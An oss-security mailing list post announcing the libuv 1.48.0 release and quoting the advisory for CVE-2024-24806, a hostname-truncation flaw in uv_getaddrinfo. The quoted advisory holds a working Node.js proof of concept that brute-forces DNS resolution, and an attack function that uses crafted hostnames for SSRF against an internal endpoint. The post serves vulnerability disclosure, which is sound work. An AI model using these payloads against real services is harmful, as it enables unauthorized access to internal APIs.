Received: (qmail 32647 invoked by uid 550); 8 Feb 2024 20:13:02 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 32626 invoked from network); 8 Feb 2024 20:13:01 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=oracle.com; h=message-id : date :
 subject : from : to : content-type : content-transfer-encoding :
 mime-version; s=corp-2023-11-20;
 bh=/qjB0w1u0hv17fs96xvNsiJ0S4GBneYWyO1fAZKiyxI=;
 b=YJkb5TKo2EOeqR9Da64y64LBh5wtdjhlTJGhJv3ob3tw+OR877dmetYkDEEiZW2bu7+w
 Q9Xzdem0fx+H33swIzLTr4hO2hmfrtMnv0PKnW9vXbDyoQkEPNlBR1q+JnrKrwBKHJJV
 7+FdXe8VXsyPOm/c6mZHwKJNdJpNR3lpy/5FRf19CDYe+tcf9lkh45hVg85crJ208S2T
 fPd0RqWBla8Zy6mGI9NUi4yTndGc/fARlzY621TQB6eM5TnDRAFjGODAjiZ/yFBEvOZq
 U/fIZTVGZT9oI3N9vOqGmVNV54RrUhro/gu5g3PeKzgpGjYjrhSGwUHOz0ff1clvcPIX aw== 
ARC-Seal: i=1; a=rsa-sha256; s=arcselector9901; d=microsoft.com; cv=none;
 b=l8HtQwDwSAyeZN+W4Ut6Kqb5OyamSMQva+hIcaHrhSZZcTk7dWHHXp2OUCcYnq5B9/oNroZpW4qliey9g5vFc2G0ezQbXIrTRzkTG2N+9p8sWvn1Pk6srdKdpljGYMjeYqhdzeKazszT90otOKhP4G2lVSc3cAsmRCOwYwE8zXsdYf8Crv02F+MLqmrKFNCT9vlWKShkY4pppD2B+E0iW7w6BIzxMVST9usioQEJfGetssTT4xkrnrsV/CiOhrX2jsx3aSxmJJWJB36b5Km41rs07p/et+v1G7GmoCtazY23laVl3Mdoy1/rqmRu5Nv3sEqOR9LosT43pWa26GTehg==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
 s=arcselector9901;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
 bh=/qjB0w1u0hv17fs96xvNsiJ0S4GBneYWyO1fAZKiyxI=;
 b=JgMp9SdEY8hy0KOcfvaE7HNJSCLk8lVdC0jdL8vT9IoqS9ZMcKiO2mKZYpMFuKM4VJKhY7JbPxyJ3mqLYGps8nnMWfhsycuTyuQczVSTZe1/CU7Rpji7nt1sFWR51lH7VSVma/aSf+F+cRCb7BCSV+9rxV0rVvdxMaSt+x6qrw6SgsVy+GThVeg/nf6121S82E3HhiXcpiDzHKuX4oSyfZd7vRECPKFQc8lfoqxzqlhMHEbY0KR10bQ82kuakmyXFk+oBOXC1vNh3Ew/f0HpcbyVMfjkdjEmgGdM7TBZkCERqvuXMn7kTJEwY+lswxV8bVgYKrWubaQlCtUF1dVGGQ==
ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
 smtp.mailfrom=oracle.com; dmarc=pass action=none header.from=oracle.com;
 dkim=pass header.d=oracle.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
 d=oracle.onmicrosoft.com; s=selector2-oracle-onmicrosoft-com;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
 bh=/qjB0w1u0hv17fs96xvNsiJ0S4GBneYWyO1fAZKiyxI=;
 b=tDt6FYsdVhKy+AvV5elTMVSPmryreUpol/eGk7i2ke5UUXljbidcJmHMiNgQK6rSe69oz+GYu2UWqhPfEXBOu0h5Fy7JlaIPGAa2dkTbVTm4WiTU+PP3nculk5AsSHLBJQeKi177iC4tGbKizshjf9ciZtCkT14bSj3X/ly+9vE=
Message-ID: <e24a80c7-33ee-408b-a86c-10eee0fe17a9@oracle.com>
Date: Thu, 8 Feb 2024 12:15:23 -0800
User-Agent: Mozilla Thunderbird
Content-Language: en-US
From: Alan Coopersmith <alan.coopersmith@oracle.com>
To: oss-security@lists.openwall.com
Autocrypt: addr=alan.coopersmith@oracle.com; keydata=
 xsDiBEab+moRBACDH5yKqS3wcc5bdxY7PBNuwKvF5TKMfagmSvuRDtZjjIIWaA/nZ1KboV9G
 q5g7kP7+Kfu+Qgd8u65eVsWwmPW10fXvj3aCU53glx2EdGdrHcgiyH2gEQfPiyBw+trIppWF
 RV0IDXSLMA1FNC92t2nSG/VFHaPTVwcgkIRSfcXDvwCglGdEa6f4uLqoNHP+m4yYnzapFuMD
 /R4+2AJDAvEWKDdYCGZzlawjAmmWyXrmT7/C/mx98qUR473l4buXjHgDkkXXlHqdzil1vK85
 PhrKzNJDCCmlHUJNz+QwiAMOLwpD+kwVPb57RG7y+a5JQ5+jtVw4RlUxZIk/wj2An9YBO3A5
 vR7PdjM32ZJCN2+aM4dYfNzQxQKTA/47icvBaBVTl9rztjg2pd2Aqpc1P/GsIYLGj7XjnnJv
 GAENBHSH1QjpZMJGCTS9oJ+B0/wrIr+pA+MdFgYAb6ojMQJOO6UChjWWSGjMFcs/CeXhxlLB
 ido3DtAETbNTwO6OEfAvdosvTdhJFnwvZlJ+zZGGy5CrF2Fd9PUe9tmASc0uQWxhbiBDb29w
 ZXJzbWl0aCA8YWxhbi5jb29wZXJzbWl0aEBvcmFjbGUuY29tPsKCBBMRCgBCAhsDBgsJCAcD
 AgYVCAIJCgsEFgIDAQIeAQIXgAIZARYhBEoZPAbTXnxnD6TvC6L7nggfLRMOBQJkQs2eBQkn
 DNS0AAoJEKL7nggfLRMO1esAnR4FVD60BpDY/bJp5RC1VXhOVlo4AKCJgsQeVeGLxDlMuhAm
 bcCkOjafqc7BTQRGm/pvEAgAmnlpSWGjmtSGlLqKTuymwBAU9G7Jw8ow27QngXS/86g/PTzm
 yhXzK0uPgeoIaTZlqaHWNKCWJnC6T2btXtaDHH6cElrClYNf94os5sSt8PBDh184W+NtctAy
 Y2dA1pQYhYs8/eXwa4E4cyrrQG75M+CHrbu9Se0vlERARCpNcjNYLpTXRCwNuUvAi905VJ0Y
 XnGX83WbJfNIq+uxnBa2gVzwb2/2FwKOG03Wyb1vs6NznWJle9x61y8/LlEDoBRbfIQTFp51
 R0ue8gX2yMVgh8lYVViHYCBq+cat7p8X41Xa/fN/HfBFPsf3/+bhggNgmaBmDJBxxd6BPB8Y
 EireiwADBgf/UWIxQwwRLkiXPacOoh34MJYQIBTrCC8gVFxetlbEPEH5mueZMJegAPTF52l8
 6REenxdNVz/0xT7BD6VlHHY5DowlbRca4W8eb3gpkX/wfNYDYCHtTifT7ewumTrNZx5mrbNk
 0XTJVOPAP3z7E0rVD2w/xo4p22DzIwfeGKwpHqt1b6Z9fmrRDwaiXaFmwUf+rIiGc/OFcOSe
 46HwTmIyTOt6NVdQSf75jOPbdeM/n1I5svOdWTLEj6QEj2q9UQ98UEPJuMdaotyBFwKlcDOO
 LMSL793fWINrYSskdXhHjaht5wWqI+egO2JfciI/vP1+bEzhpY9llGq+r7WG3nCSf8JJBBgR
 AgAJBQJGm/pvAhsMAAoJEKL7nggfLRMOgugAoIdhGnD9d/IS6fDVgv+4xnOXvyohAJ0VVxc1
 uoPzepWFbgvLuHIMvyjRog==
Content-Type: text/plain; charset=UTF-8; format=flowed
Content-Transfer-Encoding: 7bit
X-ClientProxiedBy: SJ0PR13CA0090.namprd13.prod.outlook.com
 (2603:10b6:a03:2c4::35) To DS7PR10MB5005.namprd10.prod.outlook.com
 (2603:10b6:5:3ac::15)
MIME-Version: 1.0
X-MS-PublicTrafficType: Email
X-MS-TrafficTypeDiagnostic: DS7PR10MB5005:EE_|CH3PR10MB7185:EE_
X-MS-Office365-Filtering-Correlation-Id: 6af5f072-96e3-4b8c-0242-08dc28e2aff8
X-MS-Exchange-SenderADCheck: 1
X-MS-Exchange-AntiSpam-Relay: 0
X-Microsoft-Antispam: BCL:0;
X-Microsoft-Antispam-Message-Info: 
	MxnMJQy1+qehaW4WLihrO2v0zvWhoE9Q05Cd/VuaU2E2GjKFT/MD5wljIPkhaGYYup1ooltXle+vEoZrJyCAOpuIoW8HNG6eGkJduLSeBp+i6MIK4Wf4XGTQtCPhwRVUnTTr24xmZu6Ykcl5qZemT9w6z/Gl1IPTpBcrb99n//0Eys6nslCUqk2m1aC3cwiT94CTh0NjF1isEvUwlkNXUaA9AzJUXzn4/hC1UPZrCcLeLFacY5xfRrDhnjfqpYtZ5NVVs9GMtOHpBtN7219uWPdubx0NYVJXNF9PqbQ4C+eMsOSVvvhMVqbftz9LGpGYyX2opnVGuZsqgcMeZOmTG887l+AfC9/Dsk7paDb5awic2zP388fVT7+k/4GDybqzyv7qhquLqDB6DxUYryZfh9WSXTkmsuiL1uCj/ii7ru4LjJrGFgGooOWGkUfPzgmSTzBZAu4FvYjcZi21GKJDmuSAN6OPAAQ3wQaLC0m4cxuZUVoj1vBwiZd+lpt8WqDmJT1eBd7ewMEuxQ45Mf9WgCxtiximncQbggyF7fP+wt/L839dEpNzZwX96I2B3MLHX54STBTef1AZi1P8d5+Ztw==
X-Forefront-Antispam-Report: 
	CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:DS7PR10MB5005.namprd10.prod.outlook.com;PTR:;CAT:NONE;SFS:(13230031)(376002)(396003)(39860400002)(346002)(366004)(136003)(230922051799003)(186009)(64100799003)(1800799012)(451199024)(2906002)(44832011)(5660300002)(31686004)(66899024)(41300700001)(83380400001)(31696002)(2616005)(26005)(38100700002)(66574015)(6916009)(6512007)(6486002)(66946007)(6666004)(66476007)(8676002)(6506007)(86362001)(36756003)(66556008)(478600001)(966005)(8936002)(316002);DIR:OUT;SFP:1101;
X-MS-Exchange-AntiSpam-MessageData-ChunkCount: 1
X-MS-Exchange-AntiSpam-MessageData-0: 
	=?utf-8?B?THgzcnFLQnV4UzQ4T1RkbTFkYVE4MDNwZGhzaU5KWG1QN3hvSXRjTU1pLzRT?=
 =?utf-8?B?VHNteElJREErZUh1OGU2aUFSdXkzbklUbVVGSmdxdmJOWHpDZnFkbVhYOHNk?=
 =?utf-8?B?V1dLajBreTNINDFiL01ubVBXazkzQm5KN1Q2cFI2a3REZXJMdGFHUElqUVRU?=
 =?utf-8?B?ZmVqaURPS3RCZHcxRFVjNk1pUzZYazYxcXBjM29TVHFOL29aMGlaL1dWalZl?=
 =?utf-8?B?SW95dldTaFRxeUp1TUNvMi9ZZjZWakVhdmxFeVBtL21xdDcwUzZPc3poV3F6?=
 =?utf-8?B?T0VsNXdRVWhISUExQkNjOVZsUlpxWllqdHViM1V3bWxiSnB4V0w5cjUxVWVJ?=
 =?utf-8?B?K2g5b3FiVDJ3OXhYak5KN0tockJkM01XdnpVK0JUdlRncFV5QWg5UU1QbjZY?=
 =?utf-8?B?RW1CZjEyMW1VN2ZKemlWUVQ3RUIvdVE0UFpvb0pNYStyMEEvbHJ3N3pNazZN?=
 =?utf-8?B?aGhUcmpUZllSVld0ZzBrQkRRMU85d2ZGR0pOUzFLaFFoN2gxNU8wK1R0Q3Fj?=
 =?utf-8?B?QzdpSHMva2p3bXFpTGZjQnl5NHFUa3dzS2hTMnFYZ1VxVlZ6WmdTeGkxeWRz?=
 =?utf-8?B?b3pDeTg0TitUaE1kVHl1SE54YUlSWlAvb1BDQTBRbXFJN3E0R0NIdjVPbVN4?=
 =?utf-8?B?cDg1ZEI1M3pMU2FJY1lERnFkRENSa05NemdqV1RQRmwyTDRFWW9ORjhSZDNx?=
 =?utf-8?B?VytQNU5ZOVlwR01rMHpJU2VDQlZkUk0zUncvRmhvWFZWY3FuejN1VGNlN0Q2?=
 =?utf-8?B?OUlOQ0tCeW13dk4zZVhDVGdGMHpwNVovazZWMzU1OHFLU2ZjMW5aMWF4Z3Jt?=
 =?utf-8?B?QmJ2ckRQL3pleWlENmxMN25oNHpmUWxFWDF5R1d2Ym9KWVJRUlRIYllVaW5S?=
 =?utf-8?B?NEZDK2o2aC9YQmRQRHdsZzEzUGhPdHRjQkhoY1VYTzJ1YTZCV0QzNEJZWFN6?=
 =?utf-8?B?ODJYMVRJN2RLWGU5ejVxeE5pQlZqZlRKZ0FCa2grcUFBd3ZzMFVuTTQvc3dt?=
 =?utf-8?B?bmFSa3RWN01XNmRFN0Npa24zeWdvaElPU3cxNXFXbTBDREd5dlFjTFRnbk1I?=
 =?utf-8?B?ZjRjS052WGp1RlFyQlNQdnNHRW42cDBwK1JpNTBCdmZWNzZLY1RyUEZ6YUlh?=
 =?utf-8?B?Q2E0V0NwUXJTaDZrRncxSUl4L09ZNzUvbnBHbmpFNFdoUjBJNkdmSjgxd1Qy?=
 =?utf-8?B?WDdjTktCN1VhZUh4dGFDT0lLb1Bxc1QrSHpMVnZkL3BXcmx3bVlZR2Qrbndx?=
 =?utf-8?B?ckFrUWwyR2lGaCthVjNHQkdKY2JGUGZQaStuaTdiM2pqODZrcWt0NHBBbk0y?=
 =?utf-8?B?b3lRRVAyNXNOSDRQVVBBdjd5OTRkUkQvenh6MGlMWXB5c0tMUG44V3pOaG80?=
 =?utf-8?B?L21HaVY5aGYwUVlIQlA0WkFDT2dpdlJEYUpib1ROQ0dDWUNXTDcyZlVMb21I?=
 =?utf-8?B?Umt5ZDBJU2VGUDJWaHJpZ1gzVE1jVDlRdFlQRkRxSlN2aklhRFVPUi9ZWmZD?=
 =?utf-8?B?bzVDUlVFM1hsN052WFJwYS9FWDRSTWE1ajAxVjZJN1VXYVBoZmlGQzV0SXZQ?=
 =?utf-8?B?RW5tNmZuQWxVdEZsRVFac1RrQmxLbUROOGZuOTBPVmRrTk5YSzBLUUltbmJ5?=
 =?utf-8?B?WEhQY2JhN2NKaEpESnV5QTRyOVN0Rnd0NDJURVZBWkxKemV2bGxnU01lWW5U?=
 =?utf-8?B?eExRMmZMeGVwOTByLy9RTXJ1Q2hlMENENDVuSFB6ZXJJWWdsNlozZ2RUcEox?=
 =?utf-8?B?S1RHTGltWVZwZEVNbWs0dVNrWEN3dTE4VTdLbEt4UFdKWFZRUnlXMW5TQ1dR?=
 =?utf-8?B?Tk9reE9wSmtxNFo0UkhFdEI5WDQrYml4Z3YwQmtReFFmSGk5R05oalpTYlIx?=
 =?utf-8?B?Nkd0SVhuazNSSkdJK2RER0ZSdWRnUjZ3SXFzY3p2N1ZBQTdTOFNKeFpuR2xa?=
 =?utf-8?B?eDhKK2hYYmVxVXBrZXBMVXNZZDhVVDVpNDRESCs0bnZ3QkFia0hBNlB0bG1T?=
 =?utf-8?B?ZllzTlliTU0wL3NDb3dPZ0RPMTBoM05aMEZSMWROK2tBZ0FibXRHMFNoZDFU?=
 =?utf-8?B?QUNSY3NxNkprZk0wUWdZN2tKVVBaa0thSkdpZ3lCeFppVTVLdzgyR1hFRUs4?=
 =?utf-8?B?blhwclROWDV2SG5TbGdZTXdQVGFhZzNHZ29yclNJS0UwVG5za2lRNVBlRW1l?=
 =?utf-8?B?WWc9PQ==?=
X-MS-Exchange-AntiSpam-ExternalHop-MessageData-ChunkCount: 1
X-MS-Exchange-AntiSpam-ExternalHop-MessageData-0: 
	AAqMQ7clW9msP9hWJnZmFT/iv9VSQaApm8sQ45syUfiNYkQlUllxBb58UYquq3pMoVUnf63l5XMci5hhQZ4kyXU/d7ZYJDwGG+SgCug99r2y0O6z4BA7+NVtuRpDmzZSKg0Px4If/SWWGU4tGJ/hpjQXw+Y97Tvx74FdBuZkDUOpKTIBCdtfDs7T0HYziBEkEPET4TM41rvkISWv3sTkmAwFA6qFi0vJkoSciUZ+elKQwfYNFA1F676SMsLL41+tLDsG9eJyRShmnDptqfNZChqCMX3IkWl0hW95Y5bxlV4EIC63NR8jjdccW9Rp01/bSFlBQ7HC2P8z0JwFkvuxs5c4G48zfGso0IZmVLxB4+jORpBlNJmDxogZ2tTg8qDHVTZ3Vr/8pSaT4E11OBJWAbAimP6OdTCwpKRCXi9DzTCQu3wswZmUyIuHdnUaP/XISCmwmgWx4Z5XA479PMymM5fiYVuiUqrILhMbmZ7ifZP1DAdyj+HoF2N5kn6xqpSZa9JcSGn+kmDqcApdc6rKG/iT6kwF3tGXPJ9V1e4KkrRphIEI1m2CTEUJeTCr7wwZCHpCEsG5pIsfxZdUOY1PMeNzRG94dhx5zm9axCZsx/A=
X-OriginatorOrg: oracle.com
X-MS-Exchange-CrossTenant-Network-Message-Id: 6af5f072-96e3-4b8c-0242-08dc28e2aff8
X-MS-Exchange-CrossTenant-AuthSource: DS7PR10MB5005.namprd10.prod.outlook.com
X-MS-Exchange-CrossTenant-AuthAs: Internal
X-MS-Exchange-CrossTenant-OriginalArrivalTime: 08 Feb 2024 20:15:26.0951
 (UTC)
X-MS-Exchange-CrossTenant-FromEntityHeader: Hosted
X-MS-Exchange-CrossTenant-Id: 4e2c6054-71cb-48f1-bd6c-3a9705aca71b
X-MS-Exchange-CrossTenant-MailboxType: HOSTED
X-MS-Exchange-CrossTenant-UserPrincipalName: oge7FAg+eesOMiDiOGHop7m+jldhoI7y7B5ASkZXnvJDxm9zzLlOYD04yYInukdUeznxF6SZwwVf3Lx2puO7EXgdVS7xjwTibTm6U1Q1OxM=
X-MS-Exchange-Transport-CrossTenantHeadersStamped: CH3PR10MB7185
X-Proofpoint-Virus-Version: vendor=baseguard
 engine=ICAP:2.0.272,Aquarius:18.0.1011,Hydra:6.0.619,FMLib:17.11.176.26
 definitions=2024-02-08_08,2024-02-08_01,2023-05-22_02
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 phishscore=0 suspectscore=0 mlxscore=0
 adultscore=0 spamscore=0 malwarescore=0 mlxlogscore=999 bulkscore=0
 classifier=spam adjust=0 reason=mlx scancount=1 engine=8.12.0-2311290000
 definitions=main-2402080107
X-Proofpoint-ORIG-GUID: sf0Iwpik47j9GzxPyK0O-yAEoy1Z6sjY
X-Proofpoint-GUID: sf0Iwpik47j9GzxPyK0O-yAEoy1Z6sjY
Subject: [oss-security] libuv 1.48.0 released, fixes CVE-2024-24806

https://github.com/libuv/libuv/releases/tag/v1.48.0 shows the release
yesterday of stable release 1.48.0, including a fix for CVE-2024-24806.

https://github.com/libuv/libuv/security/advisories/GHSA-f74f-cvh7-c6q6
offers this information about that CVE:

> Affected versions: > 1.45.x
> Patched versions:   v1.48.0
> > Summary:
> 
> The uv_getaddrinfo function in src/unix/getaddrinfo.c (and its windows
> counterpart src/win/getaddrinfo.c), truncates hostnames to 256
> characters before calling getaddrinfo. This behavior can be exploited
> to create addresses like 0x00007f000001, which are considered valid by
> getaddrinfo and could allow an attacker to craft payloads that resolve
> to unintended IP addresses, bypassing developer checks.
> 
> Details:
> 
> The vulnerability arises due to how the hostname_ascii variable (with
> a length of 256 bytes) is handled in uv_getaddrinfo and subsequently
> in uv__idna_toascii. When the hostname exceeds 256 characters, it gets
> truncated without a terminating null byte. Depending on the build and
> runtime environment, it can lead to different exploitation scenarios:
> 
>  1. For example In some nodejs builds, like the one distributed
>     with Kali Linux, the next byte in memory happens to be a null
>     byte, making the truncated hostname valid.
> 
>  2. In other builds, the last byte of the hostname is a random value
>     (0-256) but identical in successive calls, and the subsequent byte
>     is a null byte. This situation can be exploited through brute
>     force, especially in production environments where many Node.js
>     instances run in parallel (pm2, kubernetes, etc).
> 
>  3. Since the last byte is random, there are cases where it's one of
>     0-9a-f, which makes 16 possible cases (out of 256) useful for
>     calling localhost (127.0.0.x) and potentially bypassing security
>     measures on internal APIs. The same is true for calling other
>     IP-ranges.
> 
> PoC
> 
> // nodejs reproduction code:
> const dns = require('dns');
> async function run(ip, exactIP) {
>   let hexIP = ip.split('.').map(x => (+x).toString(16).padStart(2, '0')).join('');
>   if (!exactIP) {
>     hexIP = hexIP.substring(0, hexIP.length - 1);
>   }
> 
>   const payload = `0x${'0'.repeat(256-hexIP.length-2)}${hexIP}.example.com`;
>   dns.lookup(payload, (err, addr) => {
>     if (err); // not successful
>     else if (addr === ip) console.log('*', addr);
>     else console.log(' ', addr); // resolved to a shifted ip-address
>   });
> }
> 
> if (process.argv[2]) {
>   run ('4.2.2.4', true) // exact match, less probable (P=1/256), for kali-like builds works perfectly
>   // run('127.0.0.1', false); // any 127.0.0.x, higher probability (P=1/32)
> } else {
>   const cp = require('child_process')
>   for (let i=0; i<1024; ++i) {
>     cp.spawn('node', [process.argv[1], 'x'], { stdio: 'inherit' });
>   }
> }
> 
> Impact
> 
>     Access to Internal APIs:
> 
>     The following code, when deployed in an environment with multiple
>     pods (e.g., Kubernetes), is vulnerable to the attack described
>     above, potentially allowing unauthorized access to internal APIs.
> 
>     const axios = require('axios');
>     const express = require('express');
> 
>     const app = express();
>     app.get('/', async (req, res) => {
>         const url = req.query?.url || '';
>         if (new URL(url).hostname.endsWith('.example.com')) {
>           try {
>             const { data } = await axios.get(url, { timeout: 3000 });
>             res.send(data);
>           } catch(e) {
>             res.status(400).send('error');
>           }
>         } else {
>           res.status(400).send('Invalid url');
>         }
>     });
>     app.listen(80);
> 
>     // internal endpoint available only to local IPs
>     // (in reality deployed inside another service)
>     const internalApp = express();
>     internalApp.get('/secret', (req, res) => {
>       res.send('the secret panel');
>     });
>     internalApp.listen(3000);
> 
>     // pm2 start s1.js -i 128
> 
>     function attack() {
>       for (let i=0; i<128; i++) {
>         const payload = '0x' + '0'.repeat(246) + '7f000001';
>         fetch(`http://localhost?url=http://${payload}.example.com:3000/secret`)
>           .then(x => x.text())
>           .then(console.log);
>       }
>     }
> 
>     SSRF Attack:
> 
>     Another scenario involves websites (similar to MySpace) that
>     allows users to have username.example.com pages. Internal services
>     that crawl or cache these user pages can be exposed to SSRF
>     attacks if a malicious user chooses a long vulnerable username.
> 
> Severity: High
> CVE ID: CVE-2024-24806
> Credits: @arash16 Reporter

-- 
         -Alan Coopersmith-                 alan.coopersmith@oracle.com
          Oracle Solaris Engineering - https://blogs.oracle.com/solaris
